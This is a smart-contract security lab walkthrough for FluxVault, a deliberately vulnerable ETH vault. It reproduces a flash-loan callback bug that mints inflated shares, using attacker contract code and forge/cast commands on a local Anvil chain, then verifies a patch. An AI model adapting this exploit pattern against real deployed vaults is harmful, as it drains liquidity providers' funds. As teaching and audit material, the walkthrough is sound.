FV-01 — Flash-Loan Callback Share Inflation
FluxVault Smart Contract Security Audit Lab
Type: Economic accounting / cross-function callback reentrancy
Target: src/FluxVault.sol
Local proof of concept: src/FlashBorrower.sol
Targeted remediation: src/FluxVaultPatched.sol
Scope: Educational local deployment only (Foundry, Anvil, Cast, Slither)
Lab safety: FluxVault is intentionally vulnerable. Use only a disposable Anvil blockchain and Anvil-funded development accounts. Do not deploy this lab to a public network or use real funds.

Workshop note: This document fully reveals FV-01, the instructor-led example. It intentionally does not reveal the separate FV-02 student challenge.

1. What are we trying to prove?
Imagine a vault containing 100 ETH provided by Alice. Alice receives 100 FLUX shares, representing her claim on the vault. A borrower takes a 99 ETH flash loan, pays the required 0.099 ETH fee, and repays the loan in the same transaction.

Question: If the flash loan was repaid, can Alice nevertheless lose value?

In this intentionally vulnerable implementation, yes. While the flash loan is outstanding, the borrower can deposit 1 ETH, receive an unfair 100 new shares, repay the loan, and redeem those shares for 50.5495 ETH. The borrower's contract ends up with 49.4505 ETH more than it started with, before gas. Alice still holds 100 shares, but those shares are worth only 50.5495 ETH.

The important distinction: the flash loan itself is not malicious. The bug is that the vault issues ownership shares based on an incomplete asset balance during the borrower-controlled callback.
Learning objectives
By the end of this lab, you should be able to:
1. Read a small ETH vault and identify its trust boundaries.
2. Explain share issuance and flash-loan callbacks.
3. Formulate a security property about an existing depositor's claim.
4. Reproduce FV-01 on a local blockchain and with a Forge test.
5. Interpret the failure without treating static-analysis warnings as proof.
6. Verify a targeted patch and explain its limitations.
2. Repository and prerequisites
This walkthrough matches the actual contract and test names used in the workshop:
fluxvault/                       # local directory; GitHub repo may have another name
├── foundry.toml
├── src/
│   ├── FluxVault.sol
│   ├── FlashBorrower.sol
│   └── FluxVaultPatched.sol
├── test/
│   ├── FluxVault.t.sol
│   └── FluxVaultPatched.t.sol
├── lib/
│   └── forge-std/
└── docs/
    └── FV01-WALKTHROUGH.md
Tools: Foundry (forge, anvil, cast), Git, and optionally Slither. This walkthrough does not require a deployment script or Echidna harness.

If you are starting from GitHub, use your actual repository URL:
git clone --recursive https://github.com/YOUR_USERNAME/fluxvault-audit-lab.git
cd fluxvault-audit-lab
For the instructor's existing Kali project:
cd fluxvault
Check the environment and compile:
forge --version
cast --version
anvil --version
ls lib/forge-std/src/Test.sol
forge build
Forge may print lint warnings concerning external calls, event ordering, and share balance changes. A warning is a review lead, not a confirmed exploit. If forge build succeeds, continue.
Audit the ABI before reading the exploit
forge inspect FluxVault abi
forge inspect FluxVault storageLayout
Look for deposit, withdraw, flashLoan, totalAssets, balanceOf, and totalSupply.
3. Protocol reconnaissance: what does FluxVault do?
FluxVault is a minimal pooled-ETH contract with four important behaviors:
Component	Purpose	Security relevance
deposit()	Accept ETH; mint FLUX shares	Decides new ownership
withdraw()	Burn shares; return proportional ETH	Converts ownership back into money
flashLoan()	Temporarily lend ETH; require principal + fee	Transfers control to borrower before final repayment check
totalAssets()	Return the vault's current ETH balance	Used as the basis for share valuation


The share calculation for an existing pool is:
uint256 assetsBefore = totalAssets() - msg.value;
shares = msg.value * totalSupply / assetsBefore;
In words:

Shares minted = (ETH deposited × existing shares) ÷ ETH in the vault before the deposit.

For normal deposits, this makes intuitive sense. With 100 ETH and 100 shares, a 1 ETH deposit should mint 1 share.

Now look at:
function totalAssets() public view returns (uint256) {
    return address(this).balance;
}
This reports ETH currently held, not ETH currently held plus the amount temporarily owed back to the vault by a flash-loan borrower.

Audit hypothesis: If the borrower can deposit while most assets are temporarily outside the vault, the share denominator becomes artificially small.
Trust boundary: the callback
Inside flashLoan():
uint256 balanceBefore = address(this).balance;
uint256 fee = amount * FEE_BPS / BPS;
loanActive = true;
IFlashBorrower(msg.sender).onFlashLoan{value: amount}(amount, fee);
require(address(this).balance >= balanceBefore + fee, "Flash loan not repaid");
loanActive = false;
msg.sender is the borrower contract. The onFlashLoan call hands execution control to code chosen by that borrower. That code can call deposit() before returning.

deposit() has a nonReentrant modifier, but flashLoan() does not set the same entered guard. The separate loanActive flag prohibits another flashLoan() call, but the vulnerable deposit() never checks it.

This is a cross-function state-consistency bug: a callback into deposit() occurs while the vault's accounting assumptions are temporarily false.
4. Establish the expected security property
An auditor should state what must remain true before writing an exploit:
FV-01 invariant (scenario-specific): An unrelated borrower completing a fully repaid flash loan and an ordinary deposit must not reduce an existing liquidity provider's redeemable claim through artificial share dilution.

This is deliberately scoped to the scenario. Real vaults can have investment gains/losses and other mechanics; it is not a universal claim that every depositor's value can never decrease.

Starting state:
- Vault: 100 ETH
- Alice: 100 FLUX shares
- Total supply: 100 FLUX shares
- Alice's redeemable value: 100 ETH
We will check Alice's redeemable value after the attack.
5. Start a local blockchain and deploy the contracts
Terminal A — Anvil
anvil
Leave this running. Anvil prints disposable accounts and private keys. Use only its local development keys.
Terminal B — Set environment variables
cd fluxvault  # or your cloned repository
export RPC_URL=http://127.0.0.1:8545
Copy Anvil account 0 and account 1 private keys into these shell variables. Do not commit them to a file:
export DEPLOYER_KEY='PASTE_ANVIL_ACCOUNT_0_PRIVATE_KEY'
export ATTACKER_KEY='PASTE_ANVIL_ACCOUNT_1_PRIVATE_KEY'

export LP=$(cast wallet address --private-key "$DEPLOYER_KEY")
export ATTACKER_EOA=$(cast wallet address --private-key "$ATTACKER_KEY")

cast chain-id --rpc-url "$RPC_URL"
cast balance "$LP" --ether --rpc-url "$RPC_URL"
cast balance "$ATTACKER_EOA" --ether --rpc-url "$RPC_URL"
Anvil normally uses chain ID 31337.
Deploy FluxVault
forge create src/FluxVault.sol:FluxVault \
  --rpc-url "$RPC_URL" \
  --private-key "$DEPLOYER_KEY" \
  --broadcast
Copy the address from Deployed to::
export VAULT='PASTE_DEPLOYED_FLUXVAULT_ADDRESS'
cast code "$VAULT" --rpc-url "$RPC_URL"
cast call "$VAULT" 'totalAssets()(uint256)' --rpc-url "$RPC_URL"
cast call "$VAULT" 'totalSupply()(uint256)' --rpc-url "$RPC_URL"
On a fresh deployment, totalAssets and totalSupply should both be zero.
Deploy FlashBorrower
FlashBorrower has exactly one constructor parameter: the vault address.
constructor(FluxVault _vault) {
    vault = _vault;
}
Use this command with --constructor-args last:
forge create src/FlashBorrower.sol:FlashBorrower \
  --rpc-url "$RPC_URL" \
  --private-key "$ATTACKER_KEY" \
  --broadcast \
  --constructor-args "$VAULT"
Why last? In this Forge CLI invocation, options placed after --constructor-args can be interpreted as additional constructor values, causing Constructor argument count mismatch: expected 1 but got 6.

Save the new address and confirm deployed bytecode:
export BORROWER='PASTE_DEPLOYED_FLASHBORROWER_ADDRESS'
cast code "$BORROWER" --rpc-url "$RPC_URL"
The attacker EOA (ATTACKER_EOA) is the wallet that sends transactions. The FlashBorrower contract (BORROWER) is the contract that receives the loan, calls back into the vault, and holds the resulting ETH.

6. Build the legitimate baseline
Fund the vault by depositing 100 ETH from the LP account:
cast send "$VAULT" 'deposit()' \
  --value 100ether \
  --rpc-url "$RPC_URL" \
  --private-key "$DEPLOYER_KEY"
Inspect the state:
cast balance "$VAULT" --ether --rpc-url "$RPC_URL"
cast call "$VAULT" 'totalSupply()(uint256)' --rpc-url "$RPC_URL"
cast call "$VAULT" 'balanceOf(address)(uint256)' "$LP" --rpc-url "$RPC_URL"
cast call "$VAULT" 'convertToShares(uint256)(uint256)' \
  "$(cast to-wei 1 ether)" --rpc-url "$RPC_URL"
Expected values in human units:
Metric	Before exploit
Vault ETH	100 ETH
FLUX total supply	100 shares
Alice / LP balance	100 shares
One-share redemption value	1 ETH
Shares minted for an ordinary 1 ETH deposit	1 share


On-chain share amounts use 18-decimal-style integer units (100 ether corresponds to 100 × 10^18 share units in this teaching contract).
7. Static analysis and manual review
If Slither is installed, run:
slither src/FluxVault.sol
slither src/FluxVault.sol --print call-graph
slither src/FluxVault.sol --print human-summary
Optionally analyze the Foundry project:
slither . --filter-paths 'lib/|test/'
Inspect the flashLoan → onFlashLoan → deposit path manually. In particular:
- Is the callback untrusted? Yes.
- Does the vault temporarily transfer out assets? Yes.
- Does totalAssets() include an outstanding loan receivable? No.
- Can deposit() run before the loan has been repaid? Yes, in the vulnerable version.
- Does the final repayment check enforce share correctness? No; it only checks the ending ETH balance.
Do not claim that Slither automatically discovers FV-01. Detector output varies by version; a reentrancy warning is a clue, while the economic impact requires a concrete transaction sequence.
8. Understand the attacker-controlled contract
The purpose of src/FlashBorrower.sol is to implement the callback that FluxVault expects:
interface IFlashBorrower {
    function onFlashLoan(uint256 amount, uint256 fee) external payable;
}
A normal wallet cannot execute a Solidity callback. The borrower must be a contract with onFlashLoan().

The three relevant parts are:
attack(loan, depositAmount) — starts the transaction
function attack(uint256 loan, uint256 depositAmount) external {
    depositDuringLoan = depositAmount;
    vault.flashLoan(loan);
    uint256 shares = vault.balanceOf(address(this));
    vault.withdraw(shares);
    depositDuringLoan = 0;
}
It starts the loan, then after flashLoan() returns, redeems the unfairly minted shares.
onFlashLoan(amount, fee) — the malicious callback
function onFlashLoan(uint256 amount, uint256 fee) external payable override {
    require(msg.sender == address(vault), "Only vault");
    require(msg.value == amount, "Incorrect loan");
    vault.deposit{value: depositDuringLoan}();
    (bool ok,) = payable(address(vault)).call{value: amount + fee}("");
    require(ok, "Repayment failed");
}
During the loan, it deposits 1 ETH at the wrong share price and then returns 99.099 ETH directly to the vault. The direct repayment triggers the vault's receive() function; it does not mint more shares.
receive() — accepts ETH
receive() external payable {}
This lets the contract receive the borrowed ETH, initial attacker funding, and withdrawal proceeds.

PoC limitation: As written, FlashBorrower has no function to transfer its balance to the attacker's EOA. The local test proves value was extracted into the borrower contract, but not that the current contract can realize that value in the wallet. A cash-out-capable attacker implementation would need a separate authorized payout method. Keep that distinction explicit in any audit claim.
9. Reproduce FV-01 manually on Anvil
Step 1 — Fund FlashBorrower
It needs its own capital for the malicious deposit and fee. Deposit 2 ETH into the attacker contract from the attacker's Anvil wallet:
cast send "$BORROWER" \
  --value 2ether \
  --rpc-url "$RPC_URL" \
  --private-key "$ATTACKER_KEY"

cast balance "$BORROWER" --ether --rpc-url "$RPC_URL"
Expected borrower contract balance: 2 ETH.
Step 2 — Predict the transaction before running it
Point in execution	Vault ETH	Borrower ETH	Alice shares	Borrower shares	Total shares
Initial (after attacker funding)	100	2	100	0	100
Vault lends 99 ETH	1	101	100	0	100
Borrower deposits 1 ETH	2	100	100	100	200
Borrower repays 99.099 ETH	101.099	0.901	100	100	200
Borrower withdraws 100 shares	50.5495	51.4505	100	0	100


All amounts in the table are human-readable ETH or share units. Transaction gas is paid by the attacker's EOA and not included in the borrower contract balances.

The trick is in the third row. Because the vault has only 1 ETH before the attacker's deposit, this line:
shares = msg.value * supply / assetsBefore;
computes:
shares = 1 ETH × 100 shares / 1 ETH = 100 shares
A normal deposit at the original share price would mint only 1 share.
Step 3 — Trigger the exploit
cast send "$BORROWER" 'attack(uint256,uint256)' \
  "$(cast to-wei 99 ether)" \
  "$(cast to-wei 1 ether)" \
  --rpc-url "$RPC_URL" \
  --private-key "$ATTACKER_KEY" \
  --gas-limit 3000000
This is one Ethereum transaction. If the borrower cannot repay the loan plus fee, the entire transaction—including the temporary deposit—reverts.
Step 4 — Inspect the outcome
cast balance "$VAULT" --ether --rpc-url "$RPC_URL"
cast balance "$BORROWER" --ether --rpc-url "$RPC_URL"
cast call "$VAULT" 'totalSupply()(uint256)' --rpc-url "$RPC_URL"
cast call "$VAULT" 'balanceOf(address)(uint256)' "$LP" --rpc-url "$RPC_URL"
Get Alice's redeemable value:
LP_SHARES=$(cast call "$VAULT" 'balanceOf(address)(uint256)' "$LP" \
  --rpc-url "$RPC_URL")

cast call "$VAULT" 'convertToAssets(uint256)(uint256)' "$LP_SHARES" \
  --rpc-url "$RPC_URL"
Expected local result:
- Vault has 50.5495 ETH.
- FlashBorrower contract has 51.4505 ETH (started at 2 ETH).
- Alice still has 100 shares.
- Alice's shares redeem for 50.5495 ETH, instead of 100 ETH.
- Borrower contract's increase is 49.4505 ETH (before gas); as noted above, the current PoC does not expose a payout method.
Step 5 — Trace the transaction
Copy the transaction hash from cast send:
export TX_HASH='PASTE_ATTACK_TRANSACTION_HASH'
cast run "$TX_HASH" --rpc-url "$RPC_URL"
cast receipt "$TX_HASH" --rpc-url "$RPC_URL"
Explain the call sequence:
Attacker EOA
└── FlashBorrower.attack(99 ETH, 1 ETH)
    ├── FluxVault.flashLoan(99 ETH)
    │   ├── transfers 99 ETH to FlashBorrower
    │   └── FlashBorrower.onFlashLoan(99 ETH, 0.099 ETH)
    │       ├── FluxVault.deposit{value: 1 ETH}()
    │       │   └── mints 100 FLUX shares at distorted price
    │       └── sends 99.099 ETH back to FluxVault.receive()
    │   └── repayment balance check passes
    └── FluxVault.withdraw(100 shares)
        └── pays 50.5495 ETH to FlashBorrower
10. Confirm the bug with Foundry tests
The repository already contains test/FluxVault.t.sol and test/FluxVaultPatched.t.sol.
A. Normal behavior
forge test --match-test test_NormalDepositWithdrawal -vvv
forge test --match-test test_RevertWhenWithdrawMoreThanOwned -vvv
These are intended to pass, showing that normal deposit/withdraw behavior and basic checks work.
B. Exploit evidence
forge test \
  --match-test test_ExploitMintsInflatedSharesAndExtractsFunds \
  -vvvv
The test initializes a vault with 100 ETH, funds the borrower with 2 ETH, executes the 99 ETH attack, and checks that the borrower contract's balance rises by more than 49 ETH while vault funds fall below 51 ETH. It is designed to PASS when the vulnerable behavior is successfully reproduced.
C. An intentionally failing security property
function test_ExpectedInvariantBreaksUnderFlashLoan() public {
    attacker.attack(99 ether, 1 ether);
    assertGe(vault.convertToAssets(vault.balanceOf(alice)), 100 ether);
}
Run:
forge test \
  --match-test test_ExpectedInvariantBreaksUnderFlashLoan \
  -vvvv
Expected: FAIL. The assertion captures the violated security property: Alice cannot redeem the 100 ETH that she originally deposited. Here a failed test is evidence of a deliberately violated specification, not a compile error.
D. Fuzz the loan amount
forge test \
  --match-test testFuzz_AttackerProfitsWithLargeLoans \
  --fuzz-runs 1000 \
  -vv
The current fuzz test searches loan amounts from 50 ETH to 99 ETH, with a fixed 1 ETH callback deposit. It checks whether the borrower contract ends with more ETH than it started with. This is a profit-seeking test, not a general security invariant.
E. Run the remainder of the suite
Because the intentionally failing property is in the normal test suite, exclude it for a green regression run:
forge test --skip test_ExpectedInvariantBreaksUnderFlashLoan -vvv
Verification status: These are the actual test names and expected outcomes based on the source code supplied for the workshop. The accompanying test executions must still be run in your Kali checkout to record observed results.
11. Root cause: why the guards did not protect the vault
There are three contributing design choices:
1. Incomplete asset valuation: totalAssets() reads the immediate ETH balance instead of considering the outstanding flash-loan receivable during a callback.
2. Untrusted reentry into share issuance: flashLoan() lets borrower-controlled code call deposit() before the loan's accounting is settled.
3. Insufficient guard coverage: loanActive blocks nested loans, but not the share-changing operations that depend on accurate asset valuation. nonReentrant on deposit() and withdraw() does not cover a call that originates in unguarded flashLoan().
The repayment check (vault balance >= starting balance + fee) confirms the ending ETH balance, not the fairness of shares minted along the way.
Teaching takeaway: “The loan was repaid” and “the vault's ownership accounting was safe” are two different claims.

12. Verify the targeted remediation
src/FluxVaultPatched.sol keeps the same basic vault but prevents deposits and withdrawals while a flash loan is active:
function deposit() external payable nonReentrant returns (uint256 shares) {
    require(!loanActive, "Shares locked during loan");
    // existing deposit accounting
}

function withdraw(uint256 shares) external nonReentrant returns (uint256 assets) {
    require(!loanActive, "Shares locked during loan");
    // existing withdrawal accounting
}
This is a targeted FV-01 patch. It prevents the particular callback deposit that artificially inflates ownership. It is not a claim that the entire vault is now secure.

Run the patched test:
forge test \
  --match-test test_PatchBlocksInflatedShareMint \
  -vvvv
Expected: PASS, because the test uses vm.expectRevert("Shares locked during loan") and confirms that Alice's original 100-share claim remains worth 100 ETH.

You can also run:
forge test --match-contract FluxVaultPatchedTest -vvvv
Important limitation of this test: It confirms that an attempted malicious deposit during the callback reverts. It does not, on its own, prove legitimate flash loans still work or that every other possible attack is blocked. A more complete remediation assessment would add a repaying honest borrower, broader accounting invariants, and tests for other economic edge cases.
13. Final FV-01 audit finding
FV-01 — Share Inflation via Flash-Loan Callback
Field	Assessment
Category	Economic accounting / callback reentrancy
Severity	High to Critical (provisional, educational)
Affected contracts	FluxVault.sol
Affected functions	flashLoan(), deposit(), totalAssets(), withdraw() (redemption impact)
Preconditions	Existing liquidity, an untrusted flash-loan borrower, sufficient borrower funds for deposit and fee
Status	Vulnerability reproduced by source-level PoC; actual local execution results to be recorded


Description. FluxVault calculates deposit shares against address(this).balance. During a flash loan, that balance excludes ETH temporarily lent to a borrower. Because flashLoan() invokes an untrusted callback without blocking deposit(), the borrower can deposit while the apparent vault balance is artificially low and mint excessive ownership shares.

Impact. The borrower can dilute existing LP shares and redeem disproportionate vault assets. In the example with 100 ETH of initial LP liquidity, the borrower contract acquires 50.5495 ETH from redemption and ends 49.4505 ETH above its initial balance, before gas. Alice's original claim falls from 100 ETH to 50.5495 ETH. The particular demonstration contract retains the extracted ETH without an EOA cash-out function.

Root cause. Inconsistent accounting between temporarily outstanding loans and share issuance, combined with share-changing operations permitted during an untrusted callback.

Recommendation. Prevent share minting/burning during active flash loans, or explicitly account for outstanding loan principal in share valuation with carefully reviewed execution and reentrancy controls. Verify the fix with adversarial tests and normal-operation regression tests.

Severity rationale. Large potential LP losses support serious severity, but a real assessment must validate exploitability with a cash-out-capable attacker, achievable liquidity/loan amounts, and maximum practical loss before assigning a final severity.

Verification checklist:
- [ ] forge build succeeds in the final public repository.
- [ ] Normal deposit and withdrawal tests pass.
- [ ] FV-01 exploit test passes and records balance changes.
- [ ] The intentionally failing LP-claim property fails for the expected reason.
- [ ] FV-01 patched test passes because the callback deposit reverts.
- [ ] Manual Anvil deployment/attack balances match the expected arithmetic.
- [ ] Findings and severity are updated to reflect observed, not predicted, output.
14. Presenter guide: how to teach this live
Start with normal behavior. Ask: “If Alice deposits 100 ETH and gets 100 shares, what should a new user receive for depositing 1 ETH?” Answer: 1 share.

Introduce the flash loan. Ask: “What is the vault's ETH balance immediately after lending out 99 ETH?” Answer: 1 ETH.

Reveal the suspicious formula, not the exploit yet. Show totalAssets() and the deposit() share calculation. Ask: “What would the contract mint for a 1 ETH deposit right now?” Answer: 100 shares.

Ask why a security guard did not stop this. Compare entered (nonReentrant) with loanActive. Students should notice that the functions are not guarded by the same critical-state restriction.

Run the PoC. Show the call trace (forge test ... -vvvv or cast run) and compare Alice's redeemable assets before/after.

Apply the targeted fix. Run test_PatchBlocksInflatedShareMint; show the revert in the callback.

Transition to independent auditing. Ask: “We fixed FV-01. Is this proof that every accounting invariant holds?” Let students investigate the separate challenge without giving away its mechanism.
15. Quick reference: instructor's terminal checklist
# In the existing project
forge build
forge inspect FluxVault abi
forge inspect FluxVault storageLayout

# Baseline tests
forge test --match-test test_NormalDepositWithdrawal -vvv

# FV-01 proof
forge test --match-test test_ExploitMintsInflatedSharesAndExtractsFunds -vvvv

# Deliberately failing invariant
forge test --match-test test_ExpectedInvariantBreaksUnderFlashLoan -vvvv

# FV-01 patch
forge test --match-test test_PatchBlocksInflatedShareMint -vvvv

# Fuzzing
forge test --match-test testFuzz_AttackerProfitsWithLargeLoans --fuzz-runs 1000 -vv

# Entire suite except the deliberately failing invariant
forge test --skip test_ExpectedInvariantBreaksUnderFlashLoan -vvv

# Optional static review, if installed
slither src/FluxVault.sol
Final lesson: Smart contract security is not only about making every function pass its local checks. A protocol is secure only when its economic guarantees still hold across sequences of calls—including callbacks controlled by adversaries.